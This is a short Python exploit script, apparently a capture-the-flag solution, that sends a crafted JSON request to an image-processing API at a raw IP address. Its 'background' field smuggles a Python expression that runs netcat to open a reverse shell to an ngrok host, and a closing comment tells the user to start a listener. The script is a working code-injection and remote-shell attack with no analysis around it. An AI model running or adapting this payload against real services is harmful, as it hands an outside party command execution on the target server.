...
data =  { 
	"image":img, 
	"background": ["__import__('os').system('nc 2.tcp.ngrok.io 11409 -e sh')",255,255],
}

headers = {
	"Content-Type":"application/json"
}
res = requests.post("http://178.62.83.221:31688/api/alphafy",json=data)

# don't forget listening : nc -lvp {port}